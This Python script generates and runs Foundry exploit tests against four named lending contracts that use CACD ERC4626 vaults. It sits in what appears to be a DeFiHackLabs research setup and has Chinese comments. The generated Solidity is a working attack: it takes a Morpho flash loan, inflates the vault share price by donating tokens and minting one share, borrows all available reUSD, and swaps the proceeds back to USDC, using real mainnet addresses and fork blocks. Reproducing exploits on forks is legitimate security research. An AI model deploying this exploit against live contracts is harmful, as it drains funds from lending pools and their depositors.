#!/usr/bin/env python3
"""
构建 CACD Vault 攻击测试
1. 调用 inputData API 获取 swap calldata (USDC→CACD, CACD→USDC)
2. 生成 Solidity 测试文件
3. 运行 forge test
"""

import json
import urllib.request
import urllib.error
import sys
import os
import subprocess
import csv

# ============================================================
# 配置
# ============================================================
INPUTDATA_API = "http://127.0.0.1:3001/inputdata"
USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
CACD_ADDRESS = "0xCAcd6fd266aF91b8AeD52aCCc382b4e165586E29"
REUSD_ADDRESS = "0x57aB1E0003F623289CD798B1824Be09a793e4Bec"
MORPHO_BLUE = "0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb"

FORGE = r"C:\Users\Administrator\.foundry\bin\forge.exe"
FOUNDRY_DIR = r"D:\区块链\DeFiHackLabs"
GEN_DIR = os.path.join(FOUNDRY_DIR, "src", "test", "2026-erc4626", "generated")

# CACD 案例数据 (从 CSV 获取)
CACD_CASES = [
    {
        "suspicious": "0x212589b06ebba4d89d9defcc8ddc58d80e141ea0",
        "vault": "0x28Cdf6Ce79702AAeFbF217cF98cbD11f5639B9f1",
        "block": 22088294,
        "original_block": 22034938,
    },
    {
        "suspicious": "0x24CCBd9130ec24945916095eC54e9acC7382c864",
        "vault": "0x8087346b8865e5B0bF9F8A49742c2D83f6a50a6c",
        "block": 22088169,
        "original_block": 22034942,
    },
    {
        "suspicious": "0x3f2b20b8b06d0e691F57FfC0B5956a08E7631b92",
        "vault": "0xaB3cb84cBB4aCA2D4D25105E15EDB1FDE3E4a71e",
        "block": 22088294,
        "original_block": 22034984,
    },
    {
        "suspicious": "0xb5575fe3cc88ae3BDE9137EB41ad73Eaa2896A60",
        "vault": "0x8E5f09de2F040e876F5e73F8eD5D6Fe17C6eB7b6",
        "block": 22088263,
        "original_block": 22082675,
    },
]

# ============================================================
# inputData API 调用
# ============================================================
def call_inputdata_api(token_in, token_out, amount_wei, block_number):
    """调用 FlashSwap inputData API"""
    payload = {
        "token_in": token_in,
        "token_out": token_out,
        "amount": str(amount_wei),
        "block_number": block_number,
        "max_hops": 3,
        "enable_verification": False,
    }
    
    data = json.dumps(payload).encode("utf-8")
    req = urllib.request.Request(
        INPUTDATA_API,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            result = json.loads(resp.read().decode("utf-8"))
            return result
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8") if e.fp else ""
        print(f"  API HTTP 错误 {e.code}: {body}")
        return None
    except urllib.error.URLError as e:
        print(f"  API 连接错误: {e.reason}")
        return None
    except Exception as e:
        print(f"  API 异常: {e}")
        return None


def get_swap_calldata(token_in, token_out, amount_wei, block_number, label=""):
    """获取 swap calldata，返回 (target, calldata) 或 None"""
    print(f"  [{label}] {token_in[:10]}... → {token_out[:10]}... amount={amount_wei} block={block_number}")
    result = call_inputdata_api(token_in, token_out, amount_wei, block_number)
    
    if result is None:
        print(f"  [{label}] API 调用失败")
        return None
    
    # 检查是否有 multicall 数据
    multicall_to = result.get("multicall_to")
    multicall_data = result.get("multicall_data")
    
    if multicall_to and multicall_data:
        print(f"  [{label}] 成功: target={multicall_to[:20]}... data长度={len(multicall_data)}")
        return (multicall_to, multicall_data)
    
    # 尝试 steps 里的单步数据
    steps = result.get("steps", [])
    if steps and len(steps) == 1:
        step = steps[0]
        encoded = step.get("encoded_data")
        pool_addr = step.get("pool_address")
        if encoded and pool_addr:
            print(f"  [{label}] 单步: pool={pool_addr[:20]}... data长度={len(encoded)}")
            return (pool_addr, encoded)
    
    print(f"  [{label}] API 返回无有效数据: {json.dumps(result, indent=2)[:500]}")
    return None


# ============================================================
# Solidity 模板生成
# ============================================================
def generate_cacd_sol(case, swap_usdc_to_cacd, swap_cacd_to_usdc):
    """生成 CACD 专用攻击 Solidity 文件"""
    suspicious = case["suspicious"]
    block = case["block"]
    short_name = suspicious[2:10].lower()
    contract_name = f"Case_{short_name}_{block}_cacd"
    
    # swap calldata
    usdc_to_cacd_target, usdc_to_cacd_data = swap_usdc_to_cacd
    cacd_to_usdc_target, cacd_to_usdc_data = swap_cacd_to_usdc
    
    sol_content = f'''// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// ===========================================================================
// CACD Vault 攻击测试
// suspicious: {suspicious}
// vault: {case["vault"]}
// asset: CACD token ({CACD_ADDRESS})
// block: {block} (原始区块: {case["original_block"]})
// 
// 修改点：
// 1. 跳过 controller() 调用（CACD Vault 无此接口）
// 2. USDC→CACD swap 使用 inputData API 路径
// 3. CACD→USDC swap 使用 inputData API 路径
// 4. donation 直接转入 vault 地址
// ===========================================================================

import "../../basetest.sol";

interface IERC20Gen {{
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function decimals() external view returns (uint256);
    function totalSupply() external view returns (uint256);
}}

interface IERC4626Gen is IERC20Gen {{
    function mint(uint256 shares) external;
    function redeem(uint256 shares, address receiver, address owner) external;
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
}}

interface IVulnerableContractGen {{
    function addCollateralVault(uint256 shares, address receiver) external;
    function borrow(uint256 amount, uint256 minAmount, address receiver) external;
    function collateral() external view returns (address);
    function totalDebtAvailable() external view returns (uint256);
    function borrowLimit() external view returns (uint256);
}}

interface ICurvePoolGen {{
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external;
}}

interface IMorphoBlueGen {{
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}}

contract {contract_name} is BaseTestWithBalanceLog {{
    IERC20Gen private constant usdc = IERC20Gen({USDC_ADDRESS});
    IERC20Gen private constant reUsd = IERC20Gen({REUSD_ADDRESS});
    IMorphoBlueGen private constant morphoBlue = IMorphoBlueGen({MORPHO_BLUE});
    // reUSD→crvUSD Curve pool (用于 borrow 后的 reUSD swap)
    ICurvePoolGen private constant curveReusdPool = ICurvePoolGen(0xc522A6606BBA746d7960404F22a3DB936B6F4F50);

    IVulnerableContractGen private constant suspiciousVulnerableContract =
        IVulnerableContractGen({suspicious});

    IERC20Gen private vaultAsset;
    IERC4626Gen private erc4626vault;

    uint256 private constant forkBlockNumber = {block};
    uint256 private constant flashLoanAmount = 4_000 * 1e6;
    uint256 private constant attackerTransferAmount = 2_000 * 1e18;
    uint256 private constant attackerMintAmount = 1;

    uint256 private borrowAmount;

    receive() external payable {{}}

    function setUp() public {{
        vm.createSelectFork("mainnet", forkBlockNumber);
        fundingToken = address(usdc);

        erc4626vault = IERC4626Gen(suspiciousVulnerableContract.collateral());
        // 跳过 controller() - CACD Vault 没有此接口
        vaultAsset = IERC20Gen(erc4626vault.asset());
        
        // 验证 asset 确实是 CACD
        require(address(vaultAsset) == {CACD_ADDRESS}, "Asset is not CACD token");
    }}

    function testExploit() public balanceLog {{
        usdc.approve(address(morphoBlue), type(uint256).max);
        morphoBlue.flashLoan(address(usdc), flashLoanAmount, hex"");
    }}

    function onMorphoFlashLoan(uint256, bytes calldata) external {{
        require(msg.sender == address(morphoBlue), "Caller is not MorphoBlue");
        _swapUsdcForAsset();
        _manipulateOracle();
        _borrowAndSwapReUSD();
        _redeemAndFinalSwap();
    }}

    /// @dev Step 1: USDC → CACD token (via inputData API path)
    function _swapUsdcForAsset() internal {{
        // approve swap target
        address swapTarget = {usdc_to_cacd_target};
        usdc.approve(swapTarget, type(uint256).max);
        
        // 执行 USDC → CACD swap (inputData API 生成的 calldata)
        bytes memory swapData = hex"{usdc_to_cacd_data[2:] if usdc_to_cacd_data.startswith('0x') else usdc_to_cacd_data}";
        (bool ok,) = swapTarget.call(swapData);
        require(ok, "USDC->CACD swap failed");
        
        uint256 cacdBalance = vaultAsset.balanceOf(address(this));
        require(cacdBalance > 0, "No CACD received after swap");
    }}

    /// @dev Step 2: donation 直接转给 vault + mint 1 share
    function _manipulateOracle() internal {{
        vaultAsset.transfer(address(erc4626vault), attackerTransferAmount);
        vaultAsset.approve(address(erc4626vault), type(uint256).max);
        erc4626vault.mint(attackerMintAmount);
    }}

    /// @dev Step 3: borrow reUSD + swap to crvUSD → USDC
    function _borrowAndSwapReUSD() internal {{
        erc4626vault.approve(address(suspiciousVulnerableContract), type(uint256).max);
        suspiciousVulnerableContract.addCollateralVault(attackerMintAmount, address(this));
        borrowAmount = suspiciousVulnerableContract.totalDebtAvailable();
        suspiciousVulnerableContract.borrow(borrowAmount, 0, address(this));

        // reUSD → crvUSD via Curve
        reUsd.approve(address(curveReusdPool), type(uint256).max);
        curveReusdPool.exchange(0, 1, reUsd.balanceOf(address(this)), 0);
    }}

    /// @dev Step 4: redeem vault shares + CACD → USDC swap
    function _redeemAndFinalSwap() internal {{
        uint256 vaultBalance = erc4626vault.balanceOf(address(this));
        if (vaultBalance > 0) {{
            erc4626vault.redeem(vaultBalance, address(this), address(this));
        }}
        
        // CACD → USDC swap (via inputData API path)
        uint256 assetBalance = vaultAsset.balanceOf(address(this));
        if (assetBalance > 0) {{
            address swapTarget2 = {cacd_to_usdc_target};
            vaultAsset.approve(swapTarget2, assetBalance);
            
            bytes memory swapData2 = hex"{cacd_to_usdc_data[2:] if cacd_to_usdc_data.startswith('0x') else cacd_to_usdc_data}";
            (bool ok2,) = swapTarget2.call(swapData2);
            require(ok2, "CACD->USDC swap failed");
        }}
        
        // 如果 borrow 步骤产生了 crvUSD，也换回 USDC
        IERC20Gen crvUsd = IERC20Gen(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);
        uint256 crvBalance = crvUsd.balanceOf(address(this));
        if (crvBalance > 0) {{
            ICurvePoolGen curveUsdcCrvusdPool = ICurvePoolGen(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);
            crvUsd.approve(address(curveUsdcCrvusdPool), crvBalance);
            curveUsdcCrvusdPool.exchange(1, 0, crvBalance, 0);
        }}
    }}
}}
'''
    return contract_name, sol_content


# ============================================================
# 运行 forge test
# ============================================================
def run_forge_test(sol_file, contract_name, verbosity="-vvvv"):
    """运行 forge test"""
    env = os.environ.copy()
    env["NO_PROXY"] = "127.0.0.1,localhost"
    env["no_proxy"] = "127.0.0.1,localhost"
    
    cmd = [
        FORGE, "test",
        "--contracts", sol_file,
        "--match-contract", contract_name,
        verbosity,
    ]
    
    print(f"\n运行: {' '.join(cmd)}")
    print(f"工作目录: {FOUNDRY_DIR}")
    print("=" * 60)
    
    result = subprocess.run(
        cmd,
        cwd=FOUNDRY_DIR,
        env=env,
        capture_output=True,
        text=True,
        timeout=600
    )
    
    output = result.stdout + result.stderr
    print(output[-5000:] if len(output) > 5000 else output)
    return result.returncode == 0, output


# ============================================================
# 主流程
# ============================================================
def main():
    mode = sys.argv[1] if len(sys.argv) > 1 else "all"
    case_filter = sys.argv[2] if len(sys.argv) > 2 else None
    
    if mode == "api-test":
        # 仅测试 API 是否可用
        print("=" * 60)
        print("测试 inputData API 连通性")
        print("=" * 60)
        
        # 测试 USDC → CACD
        result = get_swap_calldata(
            USDC_ADDRESS, CACD_ADDRESS,
            4000 * 10**6,  # 4000 USDC
            22088294,
            "USDC→CACD"
        )
        if result:
            print(f"\n✅ USDC→CACD 成功!")
            print(f"   target: {result[0]}")
            print(f"   data: {result[1][:80]}...")
        else:
            print("\n❌ USDC→CACD 失败")
            
        # 测试 CACD → USDC  
        result2 = get_swap_calldata(
            CACD_ADDRESS, USDC_ADDRESS,
            2000 * 10**18,  # 2000 CACD
            22088294,
            "CACD→USDC"
        )
        if result2:
            print(f"\n✅ CACD→USDC 成功!")
            print(f"   target: {result2[0]}")
            print(f"   data: {result2[1][:80]}...")
        else:
            print("\n❌ CACD→USDC 失败")
        return
    
    if mode == "generate" or mode == "all":
        print("=" * 60)
        print("CACD Vault 攻击测试生成器")
        print("=" * 60)
        
        os.makedirs(GEN_DIR, exist_ok=True)
        
        results = []
        
        for i, case in enumerate(CACD_CASES):
            short = case["suspicious"][2:10].lower()
            if case_filter and case_filter not in short:
                continue
                
            print(f"\n{'='*60}")
            print(f"案例 {i+1}: {case['suspicious']}")
            print(f"  Vault: {case['vault']}")
            print(f"  区块: {case['block']} (原始: {case['original_block']})")
            print(f"{'='*60}")
            
            # Step 1: 获取 USDC → CACD calldata
            print("\n📡 调用 inputData API: USDC → CACD")
            swap_usdc_to_cacd = get_swap_calldata(
                USDC_ADDRESS, CACD_ADDRESS,
                4000 * 10**6,  # 4000 USDC in Wei
                case["block"],
                "USDC→CACD"
            )
            
            if not swap_usdc_to_cacd:
                print(f"  ⚠️  无法获取 USDC→CACD 路径，跳过此案例")
                results.append({"case": short, "status": "API_FAIL", "detail": "USDC→CACD no path"})
                continue
            
            # Step 2: 获取 CACD → USDC calldata  
            print("\n📡 调用 inputData API: CACD → USDC")
            swap_cacd_to_usdc = get_swap_calldata(
                CACD_ADDRESS, USDC_ADDRESS,
                2000 * 10**18,  # 2000 CACD in Wei (估算 redeem 后余额)
                case["block"],
                "CACD→USDC"
            )
            
            if not swap_cacd_to_usdc:
                print(f"  ⚠️  无法获取 CACD→USDC 路径，跳过此案例")
                results.append({"case": short, "status": "API_FAIL", "detail": "CACD→USDC no path"})
                continue
            
            # Step 3: 生成 Solidity 文件
            print("\n📝 生成 Solidity 文件")
            contract_name, sol_content = generate_cacd_sol(case, swap_usdc_to_cacd, swap_cacd_to_usdc)
            sol_path = os.path.join(GEN_DIR, f"{contract_name}.sol")
            
            with open(sol_path, "w", encoding="utf-8") as f:
                f.write(sol_content)
            print(f"  ✅ 已生成: {sol_path}")
            
            results.append({
                "case": short,
                "contract": contract_name,
                "sol_file": sol_path,
                "status": "GENERATED",
            })
        
        if mode == "generate":
            print("\n\n生成结果汇总:")
            for r in results:
                print(f"  {r['case']}: {r['status']}")
            return results
    
    if mode == "test" or mode == "all":
        # 运行 forge test
        print("\n" + "=" * 60)
        print("运行 forge test")
        print("=" * 60)
        
        # 找到所有 _cacd.sol 文件
        test_files = []
        for f in os.listdir(GEN_DIR):
            if f.endswith("_cacd.sol"):
                contract_name = f[:-4]  # 去掉 .sol
                rel_path = f"src/test/2026-erc4626/generated/{f}"
                test_files.append((rel_path, contract_name))
        
        if case_filter:
            test_files = [(p, c) for p, c in test_files if case_filter in c]
        
        for rel_path, contract_name in test_files:
            print(f"\n{'='*60}")
            print(f"测试: {contract_name}")
            print(f"{'='*60}")
            
            success, output = run_forge_test(rel_path, contract_name, "-vvvv")
            
            if success:
                print(f"\n✅ {contract_name} 通过!")
            else:
                print(f"\n❌ {contract_name} 失败")


if __name__ == "__main__":
    main()
